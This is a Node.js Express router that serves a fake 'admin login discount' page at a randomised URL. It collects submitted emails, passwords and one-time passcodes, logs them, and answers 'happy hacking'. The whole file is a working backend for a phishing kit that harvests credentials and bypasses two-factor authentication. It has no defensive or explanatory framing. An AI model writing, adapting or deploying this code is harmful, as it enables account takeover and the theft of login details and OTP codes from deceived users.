const express =  require('express');
const router = express.Router();
const path = require('path');
const { v4: uuidv4 } = require('uuid');
let LoginDetail;

router.get('/',(req,res)=>{
    let keyID = uuidv4().split('-')[0];
    res.redirect(`/admin/login/discount/id/${keyID}`);
});

router.get('/admin/login/discount/id/:id', async (req, res) => {
    res.sendFile(path.join(__dirname + '/../public' + '/login.html'))
});

router.post('/api/admin/login/:id',(req, res) => {
    LoginDetail = {
        id: req.params.id,
        email: req.body.email,
        password: req.body.password
    };
    console.log(LoginDetail);
    res.send('ok');
});

router.post('/api/admin/login/:id/otp', (req, res) => {
    LoginDetail['OTP'] = req.body.OTP;
    console.log(LoginDetail);
    res.send('happy hacking')
    LoginDetail = {};
});

module.exports = router